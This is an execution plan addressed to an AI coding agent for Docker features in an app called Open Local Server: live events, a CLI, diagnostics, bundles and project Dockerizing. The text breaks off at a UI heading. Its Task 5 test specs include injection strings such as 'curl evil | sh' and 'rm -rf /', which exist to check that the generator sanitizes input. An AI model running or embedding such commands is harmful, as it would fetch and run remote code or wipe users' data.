# Docker — remaining work for 2.10.0 (execution plan for any AI)

**Branch:** `release/2.10.0` (already exists, do not create another).
**Read first:** `AGENTS.md`, `docs/superpowers/plans/2026-11-05-docker-manager.md` (§2.5 performance rules), this file.
**Already built (do not redo):** Docker page (Containers / Images / Volumes / Compose tabs), container settings + environment edit, shell, compose editor/builder/presets, Connect to OLS, Create site, Reclaim space, site on/off drives container.

Six tasks. **Do them in this order, one per commit.** Each task is independent; if one blocks, skip to the next and say so.

| # | Task | Risk | Touches |
|---|---|---|---|
| 1 | Live updates (Docker events) | **High** (long-running connection) | core `docker/`, `src-tauri`, UI |
| 2 | `olsc docker …` CLI | Low | `crates/ols-cli` |
| 3 | Diagnostics warnings | Medium (startup rule) | `diagnostics.rs` |
| 4 | Site bundles + Docker | Medium | `sitebundle.rs` |
| 5 | Dockerize a project (incl. PHP extensions) | Medium–high | new `docker/dockerize.rs`, UI, MCP |
| 6 | Screenshots for new tabs | Low | `assets/`, `website/`, `README.md`, `index.html` |

---

## 0. Rules that apply to EVERY task (read twice)

### 0.1 Non-negotiable project rules (from AGENTS.md)
1. **Specs sync.** Any behavior change updates, in the SAME commit: `specs/full_documentation.md`, `specs/catalog.txt`, `specs/relationships.txt`, `specs/data_models.txt` (if types change), `specs/api_reference.md` (if a `CoreCommand` changes), `specs/diagrams/architecture.mmd` (if a layer changes), then append one line to `specs/runtime.md` under `## Log` and keep `Total meaningful source files: N` equal to the real count (add +1 per NEW source file under `crates/` or `ui/src/`; do not count tests inside existing files).
2. **Version/release docs.** New user-visible feature ⇒ also update `release-notes/v2.10.0.md`, `CHANGELOG.md` (`## [2.10.0]`), and **both** `crates/ols-core/catalog/user_manual.md` and `docs/OLS_USER_MANUAL.md` (Section 17; the two files must stay byte-identical — verify with `diff`). Do not bump the version.
3. **Errors** shown to users are `Diagnostic{problem,cause,fix}` — use `CoreError::failed_fix(problem, cause, fix)`.
4. **Secrets** only in the OS keyring. Never in logs, files, or MCP output.
5. **Images** used as references are `.webp`.
6. **Commits:** Conventional Commits (`feat:`, `fix:`, `docs:`). End the message with the two trailer lines given in your system reminder (`Co-Authored-By: …` and `Claude-Session: …`). Push with `git push origin release/2.10.0`. **Never** force-push, never rebase, never create a PR unless asked.
7. **Never run `cargo test` while the user runs `cargo tauri dev`.** Ask if unsure.

### 0.2 Performance rules (Docker must never slow the app)
- Nothing Docker-related runs at app startup. The test `app_startup_makes_no_docker_requests` in `crates/ols-core/src/docker/tests.rs` must keep passing **unchanged**.
- No timers/polling. Every engine call goes through `DockerManager::call` (hard timeout, own thread).
- Exception allowed (plan §2.5): when at least one site has a `DockerLink`, ONE status call with a 2 s timeout may run after the UI is ready.

### 0.3 Traps that already cost us time — avoid them
| Trap | What to do |
|---|---|
| **CRLF files.** `ui/src/core/commands.ts`, `responses.ts`, `types/*.ts`, `specs/full_documentation.md` (and a few others) use `\r\n`. A Python read/replace/write without care converts them to LF and makes a huge diff. | Open with `newline=''`, detect CRLF, convert your inserted text to CRLF. Reuse the helper pattern: `edit(p, old, new)` / `app(p, text)` shown in §0.5. After editing run `git diff --stat <file>`: it must show ONLY your added lines. |
| `ui/src/core/commands.ts` has two **LF-only** lines (`ignore_project`, `remove_site_from_list`) inside a CRLF file. | If your rewrite touched them, restore with `sed -i "s/\r$//"` on just those two lines. `git diff` must show no `-` lines for them. |
| **Do not run Prettier** on the UI (no config in repo; it reformats whole files). | Hand-format to match neighbours. `npm run lint` is the formatter check. |
| `cargo fmt --all` **reflows code you just wrote**, so a later search-and-replace on the old text silently matches nothing. | Always run `cargo fmt --all` **before** a scripted edit, and check each `assert old in s` passes. |
| A script that fails but the shell continues commits half-finished docs. | Start verification scripts with `set -e`, or chain with `&&`. Never `;` between the edit script and `git commit`. |
| Dialog drawn behind other cards (blur layers). | Render `<Dialog>` **outside** any `<Card>` (see `DiskUsageBar.tsx`). |
| `NumberInput` rounds to whole numbers. | Use a `Select` for fractional values (see CPU limit in `ContainerSettingsDialog.tsx`). |
| Port `8080` is reserved for Apache; ports must be unique per site. | In tests use e.g. `18080`, `18081`. |
| This container is Linux; **17 tests always fail** (Windows registry/keyring/shell). | Compare against `main`, not against zero (see §0.4). |
| Screenshots: preview shows the **last build**. | Run `npm run build` before taking screenshots. |
| A function's text changes after `cargo fmt` (multi-line). | When adding to a test list, anchor on the function name line (`fn name() {`), not on a long expression. |

### 0.4 The gate every commit must pass (copy-paste)
```bash
set -e
cd /home/user/OpenLocalServer
cargo fmt --all --check
(cd ui && npx tsc -b --noEmit && npm run lint >/dev/null 2>&1 && npm run build 2>&1 | grep -E "error|built in")
timeout 590 cargo clippy -p ols-core -p ols-mcp -p ols-cli --all-targets 2>&1 | grep -E "^error" && exit 1 || true
set +e
timeout 900 cargo test -p ols-core -p ols-helper -p ols-mcp -p olsc > /tmp/test.log 2>&1
grep -E "^test result" /tmp/test.log
grep -E "^    [a-z_:]+$" /tmp/test.log | sort -u > /tmp/fail-now.txt
# Baseline: tests that fail on unchanged main in this container
git worktree add -q /tmp/main-wt origin/main && (cd /tmp/main-wt && CARGO_TARGET_DIR=/home/user/OpenLocalServer/target cargo test -p ols-core -p ols-helper > /tmp/test-main.log 2>&1)
grep -E "^    [a-z_:]+$" /tmp/test-main.log | sort -u > /tmp/fail-main.txt; git worktree remove --force /tmp/main-wt
echo "NEW FAILURES: [$(comm -13 /tmp/fail-main.txt /tmp/fail-now.txt)]"   # must be empty
```
**Only commit if `NEW FAILURES` is empty.** (If the CLI crate's package name is not `olsc`, run `grep '^name' crates/ols-cli/Cargo.toml` and use that name.)

### 0.5 Safe doc-edit helper (use for CRLF-safe edits)
```python
def edit(p, old, new):               # replace once; fail loudly if not found
    s = open(p, newline='').read(); crlf = s.count('\r\n') > s.count('\n')//2
    if crlf: old = old.replace('\n','\r\n'); new = new.replace('\n','\r\n')
    assert old in s, (p, old[:60]); open(p,'w',newline='').write(s.replace(old,new,1))
def app(p, text):                    # append a line
    s = open(p, newline='').read(); nl = '\r\n' if s.count('\r\n') > s.count('\n')//2 else '\n'
    open(p,'w',newline='').write(s.rstrip('\r\n') + nl + text.replace('\n', nl))
```

### 0.6 How the core is wired (so you can find things)
- Add a command: enum variant in `crates/ols-core/src/command/types/commands.rs` (`#[serde(tag="type", rename_all="snake_case")]`, so `ListDockerImages` ⇒ `"list_docker_images"`), response in `.../types/responses.rs`, handler in `crates/ols-core/src/command/dispatch/docker.rs` (`dispatch_docker`, `match command { … other => return Err(other) }`), TS mirror in `ui/src/core/commands.ts` + `responses.ts` + `types/docker.ts`.
- HTTP API gating: `crates/ols-core/src/api.rs` — names starting `get_`/`list_`/`plan_` are read-only automatically; anything that changes state must be added to the `OPERATE` list **or left out** (UI-only). Destructive ones stay out.
- MCP tools: `crates/ols-mcp/src/lib.rs` — one `McpTool{…}` in `mcp_tools()` + one arm in `build_command()` + a test inside `fn docker_tools_build_commands()`. **No MCP tool may delete/rename/recreate containers or volumes.**
- Background work: `i.tasks.start(kind, title, target, steps, move |h| { … crate::command::report(&h, result) })`. Follow it in the UI with `TaskOutputDialog` (`Docker.tsx` has `setTaskId`).
- Engine calls: `DockerManager::call` / `call_body` in `crates/ols-core/src/docker/mod.rs`. Errors → `to_core_error(e, "what you were doing")`.
- Tests that need a Docker engine use `FakeEngine::start(fn(method,path)->(status,body))` in `docker/tests.rs`. Core-level tests use `crate::test_support::isolated_home()` + `Core::new(...)` and set the `docker.endpoint` setting to the fake's `tcp://addr`.
- UI lists use `RowList`/`Row` (`components/docker/DockerRows.tsx`) and `Pagination` (`components/ui/pagination.tsx`).

### 0.7 Stop-and-ask conditions
Stop and report instead of guessing if: a gate fails twice for a reason you do not understand; a task needs a new Cargo dependency; you would have to change a file outside the listed ones; you cannot find a function named here (`grep -rn` first — names below were correct on 2026-11-05).

---

## Task 1 — Live updates from Docker (events stream)

**Goal:** when a container starts/dies/is recreated, linked sites move to the new port and the Docker page refreshes within ~1 s, **without polling and without cost when nobody is looking.**

**Why risky:** a long-lived connection. Must stop cleanly, never leak threads, never run at startup.

### Design (decided — do not redesign)
- Endpoint: `GET /events?filters={"type":["container"],"event":["start","die","destroy","rename","health_status"]}` (URL-encode the JSON). The engine answers with an endless chunked JSON-lines stream.
- Add a **streaming read** to `crates/ols-core/src/docker/client.rs`: `pub fn stream_lines(endpoint, path, stop: &AtomicBool, on_line: impl FnMut(&str))`. It connects (reuse `connect`), writes the request with `Connection: close`, strips headers, then reads **chunked** data in a loop with a **read timeout of 1 s**; on a timeout it checks `stop` and loops; it returns when `stop` is true, EOF, or an error. Decode chunked incrementally (accumulate bytes, parse `size\r\n data \r\n`). Do **not** reuse `request()` (it waits for the whole body).
- `DockerManager` gets: `watchers: AtomicUsize` and `events: tokio::sync::broadcast::Sender<()>` (capacity 8). Methods `watch_start(self: &Arc<Self>, endpoint)` and `watch_stop()`. Ref-counted: first `start` spawns ONE thread (`ols-docker-events`) running `stream_lines`; the last `stop` sets the stop flag. On stream error: wait with backoff 2→5→15→60 s (checking `stop` every 200 ms) and reconnect while watchers > 0. Docker not running ⇒ the same backoff, no log spam (log once per outage).
- Debounce: collect lines; send one `()` on the broadcast channel at most every 250 ms (a tiny timer inside the same thread — no extra thread).
- On each debounced tick, in the same thread: `inner.docker.list_containers(ep, true)` (invalidate the 2 s cache first — add `pub fn forget_list(&self)`), then `inner.sync_docker_sites(&containers)` (exists in `docker/sites.rs`); if any moved, start the existing `docker-site-sync` task exactly like `ListDockerContainers` does in `dispatch/docker.rs` (**extract that block into `Inner::docker_apply_site_moves(&self, moved: Vec<String>)` and call it from both places**).
- New commands: `DockerWatch { on: bool }` → `R::Ok`. Allowed on HTTP API? **No** (UI only).
- UI: `Docker.tsx` calls `docker_watch{on:true}` in a `useEffect` when mounted and `{on:false}` in the cleanup, and also on `document.visibilitychange` (hidden ⇒ off, visible ⇒ on). It listens to a Tauri event `docker-event` and calls `refresh()` (debounce again 300 ms). Also stop when Docker is not installed.
- Forwarding to the UI: find how `task-event` is forwarded — `grep -n "task-event" src-tauri/src/lib.rs` — and add a `docker-event` forwarder next to it that subscribes to `inner.docker.subscribe()` and `app.emit("docker-event", ())`. Mirror its exact style (same spawn mechanism). **Subscribe lazily**: the forwarder is spawned once at startup but only does work when the channel sends (cheap; no Docker call).

### Steps
1. `client.rs`: implement `stream_lines` + `decode_chunk_stream` helper. **Unit tests:** chunked decode across split buffers; stops on flag within ~1.2 s against a local TCP server that sends nothing.
2. `mod.rs`: add `events`, `watchers`, `subscribe()`, `watch_start/stop`, `forget_list`. Keep `DockerManager::new()` doing **no I/O and spawning no thread**.
3. Extract `docker_apply_site_moves`.
4. Command + dispatch + TS types + `docker_watch` in `core/commands.ts`.
5. `src-tauri/src/lib.rs` forwarder (mirror `task-event`). **Do not run `cargo test -p openlocalserver`**; just `cargo build -p openlocalserver` if it compiles on Linux, otherwise `cargo check`; if the Tauri crate cannot build here, say so in the commit body and keep the change minimal and identical in shape to the task-event one.
6. UI wiring in `Docker.tsx` (cleanup MUST call `docker_watch{on:false}`).
7. **Tests (required):**
   - fake engine endpoint `GET /events…` that sends 2 chunked lines then keeps the socket open: `watch_start`, receive a broadcast tick within 2 s, `watch_stop`, assert the thread ended (`watchers == 0` and a second `watch_start` works).
   - `app_startup_makes_no_docker_requests` still passes (fake sees 0 hits; no thread named `ols-docker-events` exists — expose `DockerManager::watching() -> bool`).
   - two `watch_start` + one `watch_stop` keeps it running; second stop ends it.
8. Docs: `full_documentation.md` (new business rule "Docker live updates"), `api_reference.md` (`docker_watch`, event `docker-event`), `catalog.txt`, `relationships.txt`, `architecture_overview.md` (DockerManager line: "events stream only while the page is open"), `runtime.md`, release notes ("Docker page updates instantly when containers change"), CHANGELOG, manuals.

**Done when:** gate passes; page open ⇒ container restart refreshes the list in ~1 s; page closed ⇒ `watching()` is false; app start ⇒ zero Docker requests.
**Do NOT:** add polling `setInterval`; start the watcher from `DockerManager::new`; hold the cache mutex while reading the stream; spawn one thread per event.

---

## Task 2 — `olsc docker …` command line

**Goal:** the CLI can do the read/safe actions of the Docker page. **Look first:** `crates/ols-cli/src/args.rs` (clap enums), `crates/ols-cli/src/commands/` (one file per group, e.g. `services.rs`), `crates/ols-cli/src/ctx.rs` (how a `CoreCommand` is sent and how output is printed, `--json`), `crates/ols-cli/src/tests.rs`. **Copy the `service` subcommand's structure exactly.**

### Commands (final list)
```
olsc docker status
olsc docker ps [--all]
olsc docker start|stop|restart|pause|unpause <container>
olsc docker logs <container> [-n 200]
olsc docker images
olsc docker volumes
olsc docker df [--fresh]
olsc docker pull <image>
olsc docker compose list
olsc docker compose up|down|stop|start|restart|pull|build <compose-file> [--service <name>]
olsc docker compose check <compose-file>
olsc docker prune --dry-run [--stopped] [--dangling] [--unused-images] [--build-cache]
```
- **No** `rm`, `volume rm`, `prune` without `--dry-run`, `recreate`, `exec`. (Destructive stays in the app.)
- Mapping: `status`→`GetDockerStatus`, `ps`→`ListDockerContainers{all}`, actions→`DockerContainerAction{id,action}`, `logs`→`GetDockerContainerLogs{id,tail}`, `images/volumes/df`→`ListDockerImages/ListDockerVolumes/GetDockerDiskUsage`, `pull`→`PullDockerImage`, `compose list`→`ListDockerComposeStacks`, `compose <action>`→`DockerComposeAction`, `compose check`→`ValidateDockerCompose` (read the file in the CLI first, like the MCP tool `ols_docker_compose_check` does), `prune --dry-run`→`PlanDockerPrune`.
- Long actions return `TaskStarted{id}`: reuse the pattern the CLI already uses for `runtime install` (poll task / print steps) — find it with `grep -rn "TaskStarted" crates/ols-cli/src`. If there is no helper, print `Started task <id>; follow it with: olsc task list` **only if** such a command exists, else print the id and exit 0.
- Output: human table by default, raw JSON with the existing global `--json`. Errors print problem/cause/fix like other commands (reuse the shared printer).

### Steps
1. `args.rs`: `Docker { #[command(subcommand)] cmd: DockerCmd }` + `DockerCmd`, `ComposeCmd` enums.
2. `commands/docker.rs` (new file) + `mod` line; wire in the main `match`.
3. Tests in `crates/ols-cli/src/tests.rs`: clap parse tests for each form (use `Cli::try_parse_from`), including that `olsc docker prune` **without** `--dry-run` is rejected (make `--dry-run` required via `#[arg(long, required = true)]`).
4. Docs: `specs/api_reference.md` CLI list, `README.md` CLI section (`Full subcommands:` line add `docker`), `docs/USER_GUIDE.md` if it lists subcommands, release notes, CHANGELOG, manuals, `specs/catalog.txt`, `runtime.md` (+1 file).

**Done when:** gate passes; `olsc docker --help` lists all above; parse tests pass.
**Do NOT:** add a Docker library; shell out to `docker` from the CLI (it must go through `CoreCommand`).

---

## Task 3 — Diagnostics warnings for Docker sites

**Goal:** Dashboard/Repair show findings like "shop.test points at a container that is stopped" with a fix button. **Look first:** `crates/ols-core/src/diagnostics.rs` (`Finding`, how other rules push findings and attach `fix_commands`), `crates/ols-core/src/repair.rs` (what is *safe* auto-fix), `ui/src/components/DiagnosticsCard.tsx`.

### Rules to add (exactly these three)
| Id | When | Severity | Fix command |
|---|---|---|---|
| `docker-site-stopped:<hostname>` | site has `docker` link, engine reachable, linked container found but `state != running` | warning | `DockerContainerAction{id, action: Start}` (**manual**, not auto-fix) |
| `docker-site-missing:<hostname>` | engine reachable, no container matches the link (use `docker::sites::find_linked`) | warning | none (message says: run Up on the stack or recreate the container; or remove the link) |
| `docker-off:<n>` | ≥1 site has a link and the engine is NOT reachable | info | `StartDockerDesktop` (manual) |

### Hard rules (startup performance)
- **Skip the whole Docker section when no site has a `docker` link.** That is the case in the startup guard test, so it stays at zero requests.
- When linked sites exist: ONE `docker.status()`-style probe with the existing 2 s timeout, then at most one `list_containers` (cached). Never loop per site.
- Never mark these findings as auto-fixable. A stopped container may be stopped on purpose.
- Findings are `Diagnostic{problem,cause,fix}`-shaped like the others.

### Steps
1. Add `fn docker_findings(inner: &Inner) -> Vec<Finding>` in `diagnostics.rs` (or a small `docker/diagnostics.rs` called from it — if you add a file, +1 in `runtime.md`). Call it where the other rule groups are called.
2. **Unit-testable core:** `fn docker_findings_from(domains: &[Domain], engine: Option<&[ContainerSummary]>) -> Vec<Finding>` — pure; the wrapper only fetches. Tests: no links ⇒ empty; running ⇒ empty; stopped ⇒ 1 warning with Start fix; missing ⇒ 1; engine `None` + links ⇒ 1 info; two sites ⇒ stable ids.
3. Integration test with `FakeEngine` + `Core` (pattern: `site_switch_drives_its_container` in `docker/tests.rs`): with no links `fake.hits()==0` after `RunDiagnostics`.
4. Notification behaviour: do **not** add toasts; findings only.
5. Docs: `full_documentation.md` (Diagnostics rules), `specs/api_reference.md` (nothing new), `catalog.txt`, release notes line ("Diagnostics notices when a site's container is stopped or missing"), CHANGELOG, manuals.

**Done when:** gate passes; with a linked, stopped container the Dashboard shows the warning and the Start button works.
**Do NOT:** call Docker from the periodic watcher; add auto-fix; show a finding when Docker simply isn't installed and no site is linked.

---

## Task 4 — Site bundles and Docker

**Goal:** exporting/importing a site that has a Docker link keeps the link and the project's compose file, and **never exports passwords**. **Look first:** `crates/ols-core/src/sitebundle.rs` (what the "config document" contains, how project files are zipped, `preview`), `docs/OLS_USER_MANUAL.md` "Site bundles".

### Facts (verify, do not assume)
- `Domain` already has `docker: Option<DockerLink>` with `serde(default, skip_serializing_if = "Option::is_none")`, so it should round-trip inside the config document. **Step 1 is a test that proves it** (export → import → same `docker` link). If it does not round-trip, fix the serialization, nothing else.
- The compose file lives in the project folder, so it travels with the "project files" option. Generated passwords are in the OS keyring (`docker-compose:<hash>:<VAR>`) and **must not** be exported. The import must tell the user to recreate the stack's passwords.

### Steps
1. Test: bundle a site with `docker: Some(link)` → import → link equal. (Use the existing bundle test helpers in `sitebundle.rs`.)
2. `preview` (the data shown before import): add `docker_links: usize` and `compose_files_need_passwords: bool` (true when the bundled project folder has a compose file whose text contains `OLS_SECRET_`; use `docker::compose::secret_vars`). Add fields with `#[serde(default)]` so old bundles still load.
3. UI: in the bundle preview dialog (`ui/src/components/site/SiteBundle.tsx`) show a one-line notice when either is set: "This site uses Docker. Passwords for its compose stack are not included: open Docker → Compose → Passwords after importing, or recreate the stack." (Exact wording above.)
4. After import, **do nothing with Docker** (no auto-start). Diagnostics (task 3) will flag a missing container.
5. Tests: preview flags a bundle with a compose file containing `${OLS_SECRET_DB_PASSWORD:?x}`; no keyring access during export (assert the code path never calls `secrets::get_secret` — grep proves it: `grep -n "get_secret" crates/ols-core/src/sitebundle.rs` must show nothing new).
6. Docs: `full_documentation.md` (site bundle rule), `data_models.txt` (new preview fields), `api_reference.md` (preview response fields), release notes, CHANGELOG, manuals ("Site bundles keep a site's Docker link and compose file, never its passwords").

**Done when:** gate passes; round-trip test passes; old bundles still import.
**Do NOT:** export keyring values; start containers on import; change the bundle format version (only add optional fields).

---

## Task 5 — Dockerize a project (generate Dockerfile + compose)

**Goal:** one click creates a sensible `Dockerfile` and `compose.yaml` for a registered project from what OLS already detects — **never overwriting existing files, always previewing first.** **Look first:** `crates/ols-core/src/detection.rs` (what it detects: composer.json, package.json, manage.py, requirements, PHP/Node versions), `docker/builder.rs` (YAML quoting helper `q`, `plan` style), `docker/presets.rs` (`valid_tag`, `valid_image`).

### Design (decided)
New file `crates/ols-core/src/docker/dockerize.rs` (**+1 file in runtime.md**).

```rust
pub struct DockerizePlan {
  pub kind: String,            // "node" | "php" | "python" | "static"
  pub dockerfile: Option<String>,   // None when a Dockerfile already exists (we keep it)
  pub compose: String,
  pub dockerfile_path: String, pub compose_path: String,
  pub existing: Vec<String>,   // files that already exist and will NOT be overwritten
  pub port: u16, pub notes: Vec<String>,   // human explanations
  pub php_extensions: Vec<String>,   // PHP only: extensions that WILL be installed (empty for other kinds)
  pub unknown_extensions: Vec<String>, // PHP only: needed but not on the allow-list; listed as a note, never installed
  pub detected: Vec<String>,   // plain "what OLS found and where", e.g. "Laravel (artisan found)", "PHP 8.3 (composer.json: ^8.3)"
  pub disclaimer: String,      // the fixed notice below, always set (never empty)
  pub checklist: Vec<String>,  // the fixed "things OLS cannot see" list below, always set
}
pub fn plan(project_dir: &Path, project_type: Option<&str>, is_free: &dyn Fn(u16)->bool) -> Result<DockerizePlan, CoreError>
pub fn write(plan: &DockerizePlan, overwrite_compose: bool) -> Result<(), CoreError>
```
Detection → template (all values come from a **closed set**; never paste file contents into a template):
| Kind | Detect | Base image (tag pinned) | Port | Command |
|---|---|---|---|---|
| node | `package.json` | `node:<major>-alpine` where major from `.nvmrc` / `engines.node` (digits only, clamp 18..24, default 22) | 3000 | `npm run dev` if `scripts.dev`, else `npm start` if `scripts.start`, else add a note and use `node .` |
| php | `composer.json` | `php:<8.x>-apache` where x from `require.php` (`^8.3` → 8.3; unknown → 8.3) | 80 | Apache; if `artisan` exists set `DocumentRoot` to `/var/www/html/public` via `APACHE_DOCUMENT_ROOT` env + `sed` lines in Dockerfile; **plus the PHP extensions below** |
| python | `requirements.txt` or `pyproject.toml` | `python:3.12-slim` | 8000 | if `manage.py` ⇒ `python manage.py runserver 0.0.0.0:8000`; else if `main.py` has `FastAPI` text ⇒ `uvicorn main:app --host 0.0.0.0 --port 8000`; else a note, command `python main.py` |
| static | `index.html` | `nginx:1.28-alpine` | 80 | nginx |
- Compose: one service named after the folder slug, `build: .`, `ports: ["127.0.0.1:<free>:<port>"]` (free port found like the builder: start at the default, `+0..200`), `volumes: ["./:/app"]` for node/python dev (not for php/static: Apache/nginx serve the copied files), `restart: unless-stopped`, label `dev.ols.managed: "true"`, `extra_hosts: host.docker.internal:host-gateway`. Validate the generated compose with `compose::check_text` (must be `ok`) before returning — return an error if not.
- **Existing files:** if `Dockerfile` exists keep it (`dockerfile: None`, listed in `existing`); if a compose file exists (any of the 4 names) refuse unless `overwrite_compose` and then back it up through `compose::save_file`.
- Also write a `.dockerignore` (only if absent) with `node_modules`, `.git`, `vendor`, `.env`, `__pycache__`.
- Read at most the first 64 KB of each detected file; JSON/TOML parse failures ⇒ a note, not an error.

### Honesty to the user: what was detected, and that this is NOT guaranteed (MUST be built for every kind)
Generated files are a **starting point**. The user must be told so in four places, using these **exact fixed strings** (put them in `const`s in `dockerize.rs`; do not reword per project; never build them from project text):

**A. `detected` list** (top of the preview, plain bullets, each says WHAT and WHERE), examples:
`Project type: Laravel (found artisan)` · `PHP 8.3 (from composer.json "php": "^8.3")` · `Database: MySQL (from .env.example DB_CONNECTION)` · `Node 22 (default: no .nvmrc or engines.node found)` · `Start command: npm run dev (from package.json scripts)`.
Rule: a value that fell back to a default MUST say "default" and why; a value inferred (not declared) MUST say "guessed".

**B. `DISCLAIMER`** (always shown, a visible callout under `detected`, never collapsible, never empty):
`OLS generated these files from what it could detect in your project. They are a starting point, not a guaranteed working setup. Review them, then build and test before you rely on them.`

**C. `CHECKLIST`** (shown under the disclaimer as "OLS cannot see these — check them yourself"):
- `System packages your app needs (for example ffmpeg, imagemagick, wkhtmltopdf) are not installed.`
- `Queue workers, schedulers and cron jobs are not started: this runs one web process.`
- `Build steps (for example npm run build, composer install --no-dev, asset compilation) are only included when listed above.`
- `Your .env file and other secrets are not copied into the image: pass them with environment variables.`
- `Services your app talks to (database, cache, mail) are not created: add them in Docker → Compose, or connect to the ones OLS runs.`
Show only the items that apply? **No — always show all five** (simple, predictable, easy to test).

**D. A header comment as the FIRST lines of every generated file** (`Dockerfile`, `compose.yaml`; `.dockerignore` gets one line):
```
# Generated by Open Local Server (Docker -> Dockerize a project).
# Starting point only, NOT guaranteed to work: review it, then build and test it.
# Detected: <detected items joined with "; ">
```
Compose requires comments to be YAML-safe: every line starts with `#`. The `Detected:` line is built only from the fixed `detected` strings (which themselves contain only closed-set values — project-type names, version digits, file names from the fixed list; **no free text from project files**), and any character outside `[A-Za-z0-9 .,:;()_/"'=^~<>-]` is replaced with `?` and the line is cut at 300 chars.

**Where the user sees it:** `DockerizeDialog.tsx` renders, top to bottom: `detected` (bullets) → disclaimer callout (amber, `AlertTriangle` icon) → checklist → PHP extension lists (if any) → the two file previews → buttons. The **Create files** button stays enabled (do not force a checkbox), but its label is `Create files` and the callout is directly above the previews so it is read first. After creation, a toast/notification says: `Files created. Review them before running — OLS can't guarantee they work for your project.`

**Tests (required, in `dockerize.rs`) for this block:**
1. For **every** kind (node, php, python, static): `plan.disclaimer == DISCLAIMER`, `plan.checklist == CHECKLIST` (all five), `!plan.detected.is_empty()`.
2. Both generated files start with the three-line header; every header line starts with `#`; the YAML still parses (`compose::check_text` ok).
3. A project with **nothing detectable** (empty folder) returns an **error** `"OLS could not recognise this project."` with a fix listing the supported kinds — it must NOT generate a generic file.
4. Defaults say "default": a Node project with no `.nvmrc`/`engines` ⇒ a `detected` item containing `default`.
5. Hostile input: a `package.json` `name`/`scripts` containing `\nRUN curl evil | sh` or `\r\n` ⇒ the header and every other output contain neither `curl evil` nor a raw newline injected into a comment line.
6. A UI-side check is not required, but `DockerizeDialog` must import and render `plan.disclaimer` and `plan.checklist` from the response (not hard-coded copies) so the core stays the single source of the wording.

### PHP extensions (the official `php` images ship almost none — MUST be handled)
Without this a Laravel/WordPress project builds fine and then fails at runtime with "could not find driver". Official images include only: Core, ctype, curl, date, dom, fileinfo, filter, ftp, hash, iconv, json, libxml, mbstring, mysqlnd, openssl, pcre, PDO, pdo_sqlite, Phar, posix, readline, Reflection, session, SimpleXML, sodium, SPL, sqlite3, standard, tokenizer, xml, xmlreader, xmlwriter, zlib. Everything else must be installed.

**1. Collect the needed extension names** (`fn needed_php_extensions(dir) -> BTreeSet<String>`), from these sources only, each read at most 64 KB:
- `composer.json` → keys of `require` and `require-dev` that start with `ext-` (strip the prefix, lowercase);
- `composer.lock` → each package's `require` keys starting with `ext-` (same treatment; this catches dependencies' needs);
- `.env.example`, then `.env` only if the first is absent → `DB_CONNECTION=` value (`mysql`/`mariadb` ⇒ `pdo_mysql`, `pgsql` ⇒ `pdo_pgsql`, `sqlsrv` ⇒ `pdo_sqlsrv`), `CACHE_DRIVER|CACHE_STORE|SESSION_DRIVER|QUEUE_CONNECTION=redis` ⇒ `redis`. **Parse only the `KEY=value` pairs you look for; never copy a value anywhere except through the mapping.**
- project kind defaults: `artisan` exists (Laravel) ⇒ `pdo_mysql`, `zip`, `bcmath`, `intl`, `gd`; `wp-config.php`/`wp-content` exists (WordPress) ⇒ `mysqli`, `gd`, `zip`, `intl`, `exif`, `imagick`, `opcache`.
Also OLS knows the PHP extensions it enables for the project's own PHP (see the PHP extensions dialog / `crates/ols-core/src/php.rs` and `detection.rs`); **reuse that list only if it is a plain set of names** — `grep -n "extension" crates/ols-core/src/php.rs` first, and if reusing it is not obvious, skip it and say so in the commit body.

**2. Keep only names on an allow-list.** Hard-code this closed set in `dockerize.rs` as a `const`:
`bcmath, calendar, exif, gd, gettext, imagick, intl, mysqli, opcache, pcntl, pdo_mysql, pdo_pgsql, pgsql, redis, soap, sockets, sysvsem, xsl, zip, apcu, memcached, mongodb, xdebug` (extend only with names that exist in the installer's supported list).
- Names already built into the image (the list above) are dropped silently.
- A needed name **not** on the allow-list goes into `unknown_extensions` and produces a note: `"Needs the PHP extension X, which OLS cannot install automatically: add it to the Dockerfile yourself."` It is never written into any file. Names like `oci8`, `sqlsrv`, `pdo_sqlsrv`, `ibm_db2` always land here (they need vendor downloads).

**3. Emit the install step.** Add to the PHP Dockerfile, after `FROM`, exactly:
```
COPY --from=ghcr.io/mlocati/php-extension-installer:<PINNED> /usr/bin/install-php-extensions /usr/local/bin/
RUN install-php-extensions <names sorted, space separated>
```
- `<PINNED>`: the installer is distributed as an image; use a **fixed version tag** (e.g. `2.7`) taken from the installer's releases page, **not** `latest`. **A human must confirm this tag exists and ideally add `@sha256:<digest>`** (Docker verifies each layer's SHA-256 when pulling; AGENTS.md "verify SHA-256" is satisfied by the digest pin). Put the tag in one `const PHP_EXT_INSTALLER: &str` so it is a one-line change, and add a note to the commit body asking the maintainer to verify it. **Do not invent a digest.**
- Emit these two lines only when the final `php_extensions` list is non-empty. Then also set `composer` if `composer.json` exists: `COPY --from=composer:2 /usr/bin/composer /usr/bin/composer` (fixed tag `composer:2`).

**4. Show it.** The preview dialog lists "PHP extensions that will be installed: …" and "Needs manual setup: …" (from `unknown_extensions`) above the Dockerfile. If the list was inferred rather than declared (only from `.env`/project kind), say "guessed from your .env / project type — check it".

**5. Tests (required, in `dockerize.rs`):**
- `composer.json` with `ext-gd`, `ext-intl` ⇒ both appear, sorted, in the `RUN install-php-extensions` line.
- `composer.lock` dependency requiring `ext-zip` ⇒ included.
- `.env.example` with `DB_CONNECTION=mysql` ⇒ `pdo_mysql`; `DB_CONNECTION=sqlsrv` ⇒ `unknown_extensions` contains `pdo_sqlsrv`, **not** in the Dockerfile.
- Laravel (`artisan` present) ⇒ default set present.
- built-in names (`ext-mbstring`, `ext-json`) ⇒ dropped, no install line when nothing else is needed.
- **Hostile input:** `composer.json` requiring `ext-gd; rm -rf /` and `.env.example` with `DB_CONNECTION=mysql; curl evil | sh` ⇒ output contains neither `rm -rf` nor `curl evil`; the first goes to `unknown_extensions` (it fails the allow-list), the second maps to nothing.
- No PHP extensions needed ⇒ the Dockerfile has **no** `install-php-extensions` line and no `ghcr.io` reference.
- Generated Dockerfile for PHP never contains `latest`.

**Limits to state in the docs and notes:** extensions the project uses without declaring them (not in composer.json/lock, not implied by `.env.example`) cannot be detected; extensions that need vendor downloads are reported, not installed.

### Commands
`PlanDockerize { project_id }` → `R::DockerizePlan{plan}`; `CreateDockerize { project_id, overwrite_compose: bool }` → `R::DockerizePlan{plan}` (writes). `plan_` is read-only on the HTTP API automatically; `create_dockerize` is **not** added to `OPERATE` (UI/MCP-with-dry-run only). After writing, `i.set_docker_connected(compose_path, true)` like the builder does.

### UI
